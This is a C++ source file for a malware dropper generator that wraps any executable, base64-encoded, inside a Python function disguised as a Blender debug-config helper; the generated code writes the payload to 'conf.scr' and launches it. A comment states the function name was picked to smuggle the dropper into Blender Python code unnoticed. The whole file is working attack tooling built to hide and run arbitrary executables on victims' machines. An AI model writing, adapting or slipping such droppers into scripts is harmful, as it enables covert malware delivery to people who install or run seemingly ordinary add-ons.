// pyDropper-basic.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <vector>
#include <string>
#include <fstream>

#include "b64.h"

int main(int argc, char* argv[]) {
	// Check is the user provided a file to encode
    if (argc != 2) {
        std::cout << "Usage: " << argv[0] << " <executable to drop>" << std::endl;
        return 1;
    }
    
    // Read the input file to an std::vector<char>
    std::ifstream inFile(argv[1], std::ios::binary);
    if (!inFile.is_open()) {
        std::cout << "Error: Could not open input file" << std::endl;
        return 1;
    }
    std::vector<char> data;
    char c;
    while (inFile.get(c)) {
        data.push_back(c);
    }
    
    // Generate some python code that decodes the base64 encoded input file, writes it to a file and executes it
    std::string pythonCode;
    pythonCode += "def bl_get_generic_debug_conf():\n";  // This function name is so that I can smuggle it into blender python code and have it not look to suspicious as a function call
    pythonCode += "    import base64\n";
    pythonCode += "    import subprocess\n";
    pythonCode += "    b = b'" + base64_encode(data) + "'\n";
    pythonCode += "    d = base64.b64decode(b)\n";
    pythonCode += "    with open('conf.scr', 'wb') as f:\n";
    pythonCode += "        f.write(d)\n";
    pythonCode += "    subprocess.Popen('conf.scr')\n";
    pythonCode += "bl_get_generic_debug_conf()\n";
    
    // Write the lovely python code to a file
    std::ofstream outFile("pyDrop-" + std::string(argv[1]) + ".py");
    outFile << pythonCode;
    outFile.close();
	std::cout << "Complete. Wrote file pyDrop-" << std::string(argv[1]) << ".py" << std::endl;
    
    return 0;
}